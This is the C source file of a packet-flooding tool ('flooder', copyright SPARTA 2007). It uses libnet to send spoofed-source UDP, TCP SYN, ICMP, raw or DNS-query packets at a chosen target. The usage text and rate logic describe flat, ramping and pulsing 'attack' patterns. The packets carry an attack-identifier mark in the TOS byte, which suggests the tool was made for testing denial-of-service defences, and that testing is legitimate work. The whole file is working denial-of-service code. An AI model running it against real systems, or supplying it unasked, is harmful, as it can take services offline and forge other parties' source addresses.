/*
 * Copyright (C) 2007 SPARTA, Inc.
 * This software is licensed under the GPLv3 license, included in
 * ./GPLv3-LICENSE.txt in the source distribution
 */


#include <signal.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <getopt.h>
#include <math.h>
#ifndef WIN32
#include <sched.h>
#include <netdb.h>
#include <pcap.h>
#else
#include <winsock2.h>
#endif

#include "libnet.h"

#ifdef WIN32
#define usleep(usec) (Sleep((usec)/1000),0)
#define ENOBUFS WSAENOBUFS
#endif

typedef struct FloodParameters
{
	/* meta information */
	libnet_t *lnet;
	libnet_ptag_t ipid, protoid;
	char *interfacename;
	int attack_identifier;

	int ratetype;
	int lowrate, highrate;
	double riseshape, fallshape;
	unsigned long risetime, hightime, falltime, lowtime;
	
	/* IP fields */
	char apptype;
	char proto;
	u_long srcbase, dstbase;
	u_long srcrandmask, dstrandmask;

	/* UDP, TCP */
	u_short sportmin, sportmax;
	u_short dportmin, dportmax;
	u_long sportrange, dportrange;
	unsigned char tcpflags;

	/* ICMP */
	unsigned char typemin, typemax;
	unsigned char codemin, codemax;
	u_short typerange, coderange;

	/* Payload */
	unsigned char *payload;
	u_short lengthmin, lengthmax; /* user specified payload length */
	u_long  lengthrange;

} FloodParameters;

char	G_errbuf[LIBNET_ERRBUF_SIZE];
int		G_payload[1024];

/**************************************************************************/

void flood_defaults(FloodParameters *p);
int flood_process(FloodParameters *p);

inline void tv_zero(struct timeval *val);
inline void tv_endoftime(struct timeval *val);
inline void tv_msinc(struct timeval *val, unsigned long ms);
inline int tv_greaterequal(struct timeval *val1, struct timeval *val2);
inline double tv_asdouble(struct timeval *val);
inline double tv_sub_toms(struct timeval *val1, struct timeval *val2);

inline void build_icmp(FloodParameters *p, int plen);
inline void build_udp(FloodParameters *p, int plen);
inline void build_tcp(FloodParameters *p, int plen);
inline void build_ip(FloodParameters *p, int plen, int raw_payload);

/**************************************************************************/

enum {
	DST = 1, DSTMASK, SRC, SRCMASK, INTERFACE, PROTOCOL, LENGTHMIN, LENGTHMAX,
	SPORTMIN, SPORTMAX, DPORTMIN, DPORTMAX, TCPFLAGS,
	TYPEMIN, TYPEMAX, CODEMIN, CODEMAX,
	LOWRATE, HIGHRATE, RISETIME, HIGHTIME, FALLTIME, LOWTIME, RISESHAPE, FALLSHAPE,
	RATETYPE
};

enum {
	RATE_FLAT = 0,
	RATE_RAMPUP,
	RATE_RAMPDOWN,
	RATE_PULSE,
	RATE_RAMPPULSE
};

static struct option long_options[] = {
	{"dst",			1, 0, DST},
	{"dstmask",		1, 0, DSTMASK},
	{"src",			1, 0, SRC},
	{"srcmask",		1, 0, SRCMASK},
	{"interface",   1, 0, INTERFACE},
	{"proto",		1, 0, PROTOCOL},
	{"lengthmin",	1, 0, LENGTHMIN},
	{"lengthmax",	1, 0, LENGTHMAX},
	{"sportmin",	1, 0, SPORTMIN},
	{"sportmax",	1, 0, SPORTMAX},
	{"dportmin",	1, 0, DPORTMIN},
	{"dportmax",	1, 0, DPORTMAX},
	{"tcpflags",	1, 0, TCPFLAGS},
	{"typemin",		1, 0, TYPEMIN},
	{"typemax",		1, 0, TYPEMAX},
	{"codemin",		1, 0, CODEMIN},
	{"codemax",		1, 0, CODEMAX},

	{"lowrate",		1, 0, LOWRATE},
	{"highrate",	1, 0, HIGHRATE},
	{"risetime",	1, 0, RISETIME},
	{"hightime",	1, 0, HIGHTIME},
	{"falltime",	1, 0, FALLTIME},
	{"lowtime",		1, 0, LOWTIME},
	{"riseshape",	1, 0, RISESHAPE},
	{"fallshape",	1, 0, FALLSHAPE},

	{"ratetype",	1, 0, RATETYPE},

	{0, 0, 0, 0}
};


/**
 * Print usage information.
 */
void usage()
{
	printf("\n\n");
	printf("usage: flooder [options]\n");
	printf("\n");
	printf("    --dst          the base target IP address              (NO DEFAULT)\n");
	printf("    --dstmask       the mask to apply for randomizing dst   (default: 255.255.255.255)\n");
	printf("    --src          the base source IP address              (default: address of intf used)\n");
	printf("    --srcmask       the mask to apply for randomizing src   (default: 255.255.255.0)\n");
	printf("    --interface    IP of interface to initialize libnet with (default: libnet's default)\n");
	printf("    --proto        the IP protocol to use                  (default: 17)\n");
	printf("    --lengthmin    min size of payload                     (default: 0)\n"); 
	printf("    --lengthmax    max size of payload                     (default: 0)\n"); 
	printf("\n");
	printf("    --sportmin    min/max source port       (default: 0)\n");
	printf("    --sportmax    min/max source port       (default: 65535)\n");
	printf("    --dportmin    min/max destination port  (default: 0)\n");
	printf("    --dportmax    min/max destination port  (default: 65535)\n");
	printf("    --tcpflags    the TCP flags to use      (default: SYN)\n");
	printf("\n");
	printf("    --typemin     min ICMP type             (default: 8)\n");
	printf("    --typemax     max ICMP type             (default: 8)\n");
	printf("    --codemin     min ICMP code             (default: 0)\n");
	printf("    --codemax     max ICMP code             (default: 0)\n");
	printf("\n");
	printf(" Rate Information:\n");
	printf("    --ratetype type (default: flatrate\n");
	printf("    flatrate     use a flat rate attack of highrate      (default)\n");
	printf("             uses (highrate)\n");
	printf("    rampup       use a ramping up attack                 \n");
	printf("             uses (lowrate, risetime, riseshape, highrate)\n");
	printf("    rampdown     use a ramping down attack               \n");
	printf("             uses (highrate, falltime, fallshape, lowrate)\n");
	printf("    pulse        use a pulsing attack                    \n");
	printf("             uses (lowrate, lowtime, highrate, hightime)\n");
	printf("    ramppulse    use a ramped pulsing attack             \n");
	printf("             uses (lowrate, lowtime, risetime, riseshape,\n");
	printf("                   highrate, hightime, falltime, fallshape)\n");
	printf("\n");
	printf("    --lowrate      rate (packets/sec)                      (default: 1)\n");
	printf("    --highrate     rate (packets/sec)                      (default: 1)\n");
	printf("    --lowtime      time spent at low rate (msec)           (default: 0)\n");
	printf("    --hightime     time spent at high rate (msec)          (default: 0)\n");
	printf("    --risetime     time to rise from low to high (msec)    (default: 0)\n");
	printf("    --falltime     time to fall from high to low (msec)    (default: 0)\n");
	printf("    --riseshape    shape of rise curve (1.0 = linear)      (default: 1.0)\n");
	printf("    --fallshape    shape of fall curve (1.0 = linear)      (default: 1.0)\n");
	printf("\n");
	exit(0);
}


void flood_defaults(FloodParameters *p)
{
	p->lnet = NULL;
	p->ipid = LIBNET_PTAG_INITIALIZER;
	p->protoid = LIBNET_PTAG_INITIALIZER;
	p->interfacename = NULL;
	p->attack_identifier = 0xE0; /* id is ipprecendence 7, tos 0 */

	p->ratetype = 0;
	p->lowrate = 0;
	p->highrate = 0;
	p->risetime = 0;
	p->hightime = 0;
	p->falltime = 0;
	p->lowtime = 0;
	p->riseshape = 1.0;
	p->fallshape = 1.0;

	/* Default for ip is to randomize last byte of src, but use one dst */
	p->apptype = 0;
	p->proto = 17;
	p->srcbase = 0;
	p->srcrandmask = 0x000000FF;
	p->dstbase = 0;
	p->dstrandmask = 0;

	/* Default for proto is to run completely random ports */
	p->sportmin = 0;
	p->sportmax = 65535;
	p->sportrange = 65536;
	p->dportmin = 0;
	p->dportmax = 65535;
	p->dportrange = 65536;
	p->tcpflags = TH_SYN;

	/* Default for icmp is ECHO */
	p->typemin = 8;
	p->typemax = 8;
	p->typerange = 0;
	p->codemin = 0;
	p->codemax = 0;
	p->coderange = 0;

	/* default payload is nothing */
	p->payload = (unsigned char*)G_payload;
	p->lengthmin = 0;
	p->lengthmax = 0;
	p->lengthrange = 0;
}


int gethost(char *input, struct in_addr *address)
{
	struct hostent *result = gethostbyname(input);
	if (result)
	{
		*address = *(struct in_addr *)result->h_addr;
		return 1;
	}
	
	fprintf(stderr, "Error getting address for %s (%d)\n", input, h_errno);
	return 0;
}


/**
 * Given an IP, find the matching IF name.
 */
char *ip2if(char *ipstr)
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	u_long inip = inet_addr(ipstr);
	char errbuf[PCAP_ERRBUF_SIZE];
	char *ret = NULL;
	struct sockaddr_in *ipptr;
	
	/* Retrieve the device list on the local machine */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	
	/* Print the list */
	for(d=alldevs; d; d=d->next)
	{
		if ((d->addresses == NULL) || (d->addresses->addr == NULL)) continue;
		ipptr = (struct sockaddr_in *)d->addresses->addr;
		if (ipptr->sin_addr.s_addr == inip)
		{
			ret = strdup(d->name);
			break;
		}
	}

	pcap_freealldevs(alldevs);
	return ret;
}


/**
 * Main entry point.
 */
int main(int argc, char *argv[])
{
	FloodParameters param;
	int ii, c;
	struct in_addr address;

	/* Initialize our state variables. */
	flood_defaults(&param);

#ifdef WIN32
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);
#endif


	while ((c = getopt_long (argc, argv, "", long_options, NULL)) != -1)
	{
		switch (c)
		{
			case RATETYPE:
				if (!strcasecmp("rampup", optarg)) param.ratetype = RATE_RAMPUP;
				else if (!strcasecmp("rampdown", optarg)) param.ratetype = RATE_RAMPDOWN;
				else if (!strcasecmp("pulse", optarg)) param.ratetype = RATE_PULSE;
				else if (!strcasecmp("ramppulse", optarg)) param.ratetype = RATE_RAMPPULSE;
				else param.ratetype = RATE_FLAT;
				break;

			case DST:		if (gethost(optarg, &address)) param.dstbase = ntohl(address.s_addr); break;
			case DSTMASK:	if (gethost(optarg, &address)) param.dstrandmask = ~ntohl(address.s_addr); break;
			case SRC:		if (gethost(optarg, &address)) param.srcbase = ntohl(address.s_addr); break;
			case SRCMASK:	if (gethost(optarg, &address)) param.srcrandmask = ~ntohl(address.s_addr); break;


			case PROTOCOL:
				param.proto = atoi(optarg);
				if (param.proto == 0)
				{
					if (!strncmp(optarg, "DNS", 3))
					{
						param.apptype = 1;
						param.proto = 17;
					}
					else
					{
				 		struct protoent *x = getprotobyname(optarg);
						if (x != NULL) param.proto = x->p_proto;
					}
				}

				if (param.apptype == 1)
				{
					param.dportmin = param.dportmax = 53;
				}
				break;

			case INTERFACE:		param.interfacename = ip2if(optarg); break;
			case LENGTHMIN:		param.lengthmin = atoi(optarg);	break;
			case LENGTHMAX:		param.lengthmax = atoi(optarg);	break;
			case SPORTMIN:		param.sportmin  = atoi(optarg);	break;
			case SPORTMAX:		param.sportmax  = atoi(optarg);	break;
			case DPORTMIN:		param.dportmin  = atoi(optarg);	break;
			case DPORTMAX:		param.dportmax  = atoi(optarg);	break;
			case TCPFLAGS:		param.tcpflags  = atoi(optarg);	break;
			case TYPEMIN:		param.typemin   = atoi(optarg);	break;
			case TYPEMAX:		param.typemax   = atoi(optarg);	break;
			case CODEMIN:		param.codemin   = atoi(optarg);	break;
			case CODEMAX:		param.codemax   = atoi(optarg);	break;

			case LOWRATE:		param.lowrate	= atoi(optarg);	break;
			case HIGHRATE:		param.highrate  = atoi(optarg);	break;

			case RISETIME:		param.risetime	= atoi(optarg); break;
			case HIGHTIME:		param.hightime	= atoi(optarg); break;
			case FALLTIME:		param.falltime	= atoi(optarg); break;
			case LOWTIME:		param.lowtime	= atoi(optarg); break;

			case RISESHAPE:		param.riseshape	= atof(optarg);	break;
			case FALLSHAPE:		param.fallshape	= atof(optarg);	break;

			default:
				printf("Ignoring argument: (c=%d) (optopt=%d)\n", c, optopt);
				break;
		}
	}

	if (param.sportmax < param.sportmin)	param.sportmax = param.sportmin;
	if (param.dportmax < param.dportmin)	param.dportmax = param.dportmin;
	if (param.typemax < param.typemin)		param.typemax = param.typemin;
	if (param.codemax < param.codemin)		param.codemax = param.codemin;
	if (param.lengthmax < param.lengthmin)	param.lengthmax = param.lengthmin;

	param.sportrange  = param.sportmax  - param.sportmin  + 1;
	param.dportrange  = param.dportmax  - param.dportmin  + 1;
	param.typerange   = param.typemax   - param.typemin   + 1;
	param.coderange   = param.codemax   - param.codemin   + 1;
	param.lengthrange = param.lengthmax - param.lengthmin + 1;

	/* Make sure we got a real destination */
	if (param.dstbase == 0)
	{
		printf("Need a destination.\n");
		usage();
		return -1;
	}

	/* Initialize the library.  Root priviledges are required.  */
	if ((param.lnet = libnet_init(LIBNET_RAW4, param.interfacename, G_errbuf)) == NULL)
	{
		fprintf(stderr, "libnet_init() failed: %s\n", G_errbuf);
		return -1;
	}

	/* If src base is not set to anything, set to our local IP */
	if (param.srcbase == 0)
	{
		param.srcbase = ntohl(libnet_get_ipaddr4(param.lnet));
	}

	/* Some random data for packet contents */	
	libnet_seed_prand(param.lnet);
	for (ii = 0; ii < 1024; ii++)
		G_payload[ii] = libnet_get_prand(LIBNET_PR32);

#ifndef WIN32
	{
	struct sched_param sp = {1};
	sched_setscheduler(0, SCHED_FIFO, &sp);
	}
#endif

	/* Could fork off threads here if desired. */
	flood_process(&param);

	return 0;
}


enum {
	STATE_LOW = 0,
	STATE_RISING,
	STATE_HIGH,
	STATE_FALLING,
};

/**
 * Takes some flood parameters, rate and a protocol and goes for it.
 */
int flood_process(FloodParameters *p)
{
	int tosend = 0, thislen;
	struct timeval start, before, after; 
	int usleep_time, last_usleep = -1;
	int real_work, sleep_desired, real_sleep, sleep_overshoot;

/*
	int rate_type;
	int lowrate, highrate;
	int risetime, hightime, falltime, lowtime;
	double riseshape, fallshape;
*/
	int state;
	struct timeval lastchange, nextchange;
	double riserate, fallrate;
	double ratenow;
	double x, y;

	// y = pow(x, shape) * ramprate + startrate; (x is time, y is rate)
	// Pre-calculate rate (static) before we get into the loop
    //   

	riserate = 0; /* based on time axis in ms */
	if (p->risetime > 0)
	{
		y = (double)(p->highrate - p->lowrate);
		riserate = y/pow(p->risetime, p->riseshape);
		printf("riserate is %lf, riseshape is %lf\n", riserate, p->riseshape);
	}

	fallrate = 0; /* based on time axis in ms */
	if (p->falltime > 0)
	{
		y = (double)(p->lowrate - p->highrate);
		fallrate = y/pow(p->falltime, p->fallshape);
		printf("fallrate is %lf, fallshape is %lf\n", fallrate, p->fallshape);
	}


	/* init variables */
	real_work = sleep_desired = real_sleep = sleep_overshoot = 0;

	/* init times */
	gettimeofday(&start, NULL);
	gettimeofday(&after, NULL);
	gettimeofday(&lastchange, NULL);
	gettimeofday(&nextchange, NULL);

	/* init state */
	switch (p->ratetype)
	{
		case RATE_FLAT:
			state = STATE_HIGH;	
			tv_endoftime(&nextchange);
			break;

		case RATE_RAMPUP:
		case RATE_RAMPPULSE:
			state = STATE_RISING;	
			tv_msinc(&nextchange, p->risetime);
			break;

		case RATE_RAMPDOWN:
			state = STATE_FALLING;	
			tv_msinc(&nextchange, p->falltime);
			break;

		case RATE_PULSE:
			state = STATE_HIGH;	
			tv_msinc(&nextchange, p->hightime);
			break;
	}

	/*****   Big Loop   *****/
	while(1) 	
	{
		gettimeofday(&before, NULL);

		/* If we've reached the next change location, adjust state accordingly */
		if (tv_greaterequal(&before, &nextchange))
		{
			gettimeofday(&lastchange, NULL);
			//printf("before (%d,%d) nextch(%d,%d)\n", before.tv_sec, before.tv_usec, nextchange.tv_sec, nextchange.tv_usec);
			switch (p->ratetype)
			{
				case RATE_RAMPPULSE:
					     if (state == STATE_HIGH) { state = STATE_FALLING; tv_msinc(&nextchange, p->falltime); }
					else if (state == STATE_FALLING) { state = STATE_LOW; tv_msinc(&nextchange, p->lowtime); }
					else if (state == STATE_LOW) { state = STATE_RISING; tv_msinc(&nextchange, p->risetime); }
					   else { state = STATE_HIGH; tv_msinc(&nextchange, p->hightime); }
					break;

				case RATE_PULSE:
					if (state == STATE_HIGH) { state = STATE_LOW; tv_msinc(&nextchange, p->lowtime); }
					else { state = STATE_HIGH;	tv_msinc(&nextchange, p->hightime); }
					break;

				case RATE_RAMPDOWN:
					state = STATE_LOW;	
					tv_endoftime(&nextchange);
					break;

				case RATE_FLAT:
				case RATE_RAMPUP:
				default:
					state = STATE_HIGH;	
					tv_endoftime(&nextchange);
					break;
			}
		}


		/* Once we are sure of our state, calculate rate based on that */
		switch (state)
		{
			case STATE_HIGH:
				ratenow = (double)p->highrate;
				break;
				
			case STATE_LOW:
				ratenow = (double)p->lowrate;
				break;

			case STATE_RISING:
				x = tv_sub_toms(&before, &lastchange);
				if (x > 0)
					ratenow = pow(x, p->riseshape) * riserate + (double)p->lowrate;
				else
					ratenow = (double)p->lowrate;
				break;

			case STATE_FALLING:
				x = tv_sub_toms(&before, &lastchange);
				if (x > 0)
					ratenow = pow(x, p->fallshape) * fallrate + (double)p->highrate;
				else
					ratenow = (double)p->highrate;
				break;
		}


		if (ratenow <= 1)  ratenow = 1;

		usleep_time = (int)(1000000.0/ratenow); 
		if (last_usleep != usleep_time)
		{
			//printf("ratenow = %lf, usleep = %d\n", ratenow, usleep_time);
			last_usleep = usleep_time;
		}


		if (usleep_time > 0)
		{
			/* real_work is a measurement of useconds that we last spent generating packets (now - lastafter) */
			real_work = before.tv_usec - after.tv_usec + (1000000 * (before.tv_sec - after.tv_sec));

			/* We pick our regular sleep period minus the time to send the last packet minus any overshoot from the last sleep */
			int sleep_desired = usleep_time - real_work - sleep_overshoot;
			if (sleep_desired > 0)
				usleep(sleep_desired);

			/* Find out how long we really slept for (after - before) */
			gettimeofday(&after, NULL);
			int real_sleep = after.tv_usec - before.tv_usec + (1000000 * (after.tv_sec - before.tv_sec));

			if (real_sleep >= sleep_desired)
			{
				/* for each full slice of overslept time, add to the number of packet to now send */
				real_sleep -= sleep_desired;
				tosend = 1 + (real_sleep / usleep_time); 

				/* For the remainder (partial slice), make note so we can apply it next loop */
				sleep_overshoot = real_sleep % usleep_time;
			}
			else
			{ /* only during sub 10 usec sleep times do we sometimes get here, we shouldn't by usleep definition */
				tosend = 1;
				sleep_overshoot = sleep_desired - real_sleep;
			}
		}
		else
		{
			tosend = 50;
		}

		while (tosend > 0)
		{
			/* Decide on a size change. */
			thislen = p->lengthmin;
			if (p->lengthrange > 0) thislen += (libnet_get_prand(LIBNET_PRu16) % p->lengthrange);

			switch (p->apptype)
			{
				case 1: /* special DNS id */
					//f64a 0100 0001 0000 0000 0000 036a 6f65 0765 7861 6d70 6c65 0363 6f6d 0000 0100 01
					thislen = sprintf(p->payload, "%c%c%c%c%c%c%c%c%c%c%c%c%cjoe%cexample%ccom%c%c%c%c%c", 
								0,libnet_get_prand(LIBNET_PR8),  1,0,0,1,  0,0,0,0,0,0,  3,7,3,0,  0,1,0,1);
					break;
			}

			/* Build/Modify the desired upper level protocol header. */
			switch(p->proto)
			{
				case 17:
					if (thislen > 1472) thislen = 1472;
					build_udp(p, thislen);
					thislen += LIBNET_UDP_H;
					build_ip(p, thislen, 0);
					break;

				case 6:
					if (thislen > 1460) thislen = 1460;
					build_tcp(p, thislen);
					thislen += LIBNET_TCP_H;
					build_ip(p, thislen, 0);
					break;

				case 1:
					if (thislen > 1476) thislen = 1476;
					build_icmp(p, thislen);
					thislen += LIBNET_ICMPV4_H;
					build_ip(p, thislen, 0);
					break;

				default:
					if (thislen > 1480) thislen = 1480;
					build_ip(p, thislen, 1);
					break;
			}
	
			/* See if we actually built something. */
			if (p->ipid == -1)
			{
				fprintf(stderr, "Can't build headers (%d,%d): %s\n", p->ipid, p->protoid, libnet_geterror(p->lnet));
				return -1;
			}
			
			/* Write it to the wire.  */
			if (libnet_write(p->lnet) == -1)
			{
				// Why does this error every random 10000th packet or so? 
				fprintf(stderr, "Write error: %s\n", libnet_geterror(p->lnet));
			}

			tosend--;
		}
	
	}
}
		
/* val = 0 */
inline void tv_zero(struct timeval *val)
{
	val->tv_sec = 0;
	val->tv_usec = 0;
}

/* val = MAX_VAL */
inline void tv_endoftime(struct timeval *val)
{
	val->tv_sec = 0x7FFFFFFF;
	val->tv_usec = 0x7FFFFFFF;
}

/* val += ms */
inline void tv_msinc(struct timeval *val, unsigned long ms)
{
	val->tv_sec += (ms/1000);
	val->tv_usec += ((ms%1000) * 1000);
	if (val->tv_usec >= 1000000)
	{
		val->tv_usec -= 1000000;
		val->tv_sec += 1;
	}
}

/* Is val1 >= val2 */
inline int tv_greaterequal(struct timeval *val1, struct timeval *val2)
{
	if (val1->tv_sec > val2->tv_sec) return 1;
	if ((val1->tv_sec == val2->tv_sec) && (val1->tv_usec > val2->tv_usec)) return 1;
	return 0;
}

/* change to a double in seconds */
inline double tv_asdouble(struct timeval *val)
{
	double ret = (double)val->tv_sec;
	ret += ((double)val->tv_usec)/1000000;
	return ret;
}

/* ret = val1 - val2  in ms, val1 must be greateer than val2 */
inline double tv_sub_toms(struct timeval *val1, struct timeval *val2)
{
	double sec = val1->tv_sec - val2->tv_sec;
	double usec = val1->tv_usec - val2->tv_usec;
	if (usec < 0)
	{
		sec -= 1;
		usec += 1000000;
	}

	return ((sec*1000) + (usec/1000));
}



/* ICMP */
inline void build_icmp(FloodParameters *p, int payloadlen)
{
	u_char tmptype, tmpcode;
	u_short tmpid, tmpseq;

	tmptype = p->typemin;
	if (p->typerange > 0) tmptype +=  (libnet_get_prand(LIBNET_PR8) % p->typerange);
	tmpcode = p->codemin;
	if (p->coderange > 0) tmpcode += (libnet_get_prand(LIBNET_PR8) % p->coderange);
	tmpid = 0;
	tmpseq = 42;

	if (payloadlen > 0)
		p->protoid = libnet_build_icmpv4_echo(tmptype, tmpcode, 0, tmpid, tmpseq, p->payload, payloadlen, p->lnet, p->protoid);
	else
		p->protoid = libnet_build_icmpv4_echo(tmptype, tmpcode, 0, tmpid, tmpseq, NULL, 0, p->lnet, p->protoid);
}

/* UDP */
inline void build_udp(FloodParameters *p, int payloadlen)
{
	u_short tmpsport, tmpdport;

	tmpsport = p->sportmin;
	if (p->sportrange > 0) tmpsport += (libnet_get_prand(LIBNET_PRu16) % p->sportrange);
	tmpdport = p->dportmin;
	if (p->dportrange > 0) tmpdport += (libnet_get_prand(LIBNET_PRu16) % p->dportrange);

	if (payloadlen > 0)
		p->protoid = libnet_build_udp(tmpsport, tmpdport, payloadlen+LIBNET_UDP_H, 0, p->payload, payloadlen, p->lnet, p->protoid);
	else
		p->protoid = libnet_build_udp(tmpsport, tmpdport, LIBNET_UDP_H, 0, NULL, 0, p->lnet, p->protoid);
}

/* TCP */
inline void build_tcp(FloodParameters *p, int payloadlen)
{
	u_long tmpseq, tmpack;
	u_short tmpsport, tmpdport;
	u_char tmpflg;

	tmpsport = p->sportmin;
	if (p->sportrange > 0) tmpsport += (libnet_get_prand(LIBNET_PRu16) % p->sportrange);
	tmpdport = p->dportmin;
	if (p->dportrange > 0) tmpdport += (libnet_get_prand(LIBNET_PRu16) % p->dportrange);
	tmpflg = p->tcpflags;

	tmpseq = libnet_get_prand(LIBNET_PRu32);
	tmpack = libnet_get_prand(LIBNET_PRu32);

	if (payloadlen > 0)
		p->protoid = libnet_build_tcp(tmpsport, tmpdport, tmpseq, tmpack, tmpflg, 65535, 0, 0,
									payloadlen+LIBNET_TCP_H, p->payload, payloadlen, p->lnet, p->protoid);
	else
		p->protoid = libnet_build_tcp(tmpsport, tmpdport, tmpseq, tmpack, tmpflg, 65535, 0, 0, LIBNET_TCP_H, NULL, 0, p->lnet, p->protoid);
}

/* IP */
inline void build_ip(FloodParameters *p, int payloadlen, int raw_payload)
{
	u_long tmpsrc, tmpdst;

	tmpsrc = htonl(p->srcbase | (libnet_get_prand(LIBNET_PRu32) & p->srcrandmask));
	tmpdst = htonl(p->dstbase | (libnet_get_prand(LIBNET_PRu32) & p->dstrandmask));

	if ((raw_payload) && (payloadlen > 0))
		p->ipid = libnet_build_ipv4(payloadlen+LIBNET_IPV4_H, p->attack_identifier, 0, 0, 64, p->proto, 0, tmpsrc, tmpdst,
									p->payload, payloadlen, p->lnet, p->ipid);
	else
		p->ipid = libnet_build_ipv4(payloadlen+LIBNET_IPV4_H, p->attack_identifier, 0, 0, 64, p->proto, 0, tmpsrc, tmpdst,
									NULL, 0, p->lnet, p->ipid);
}

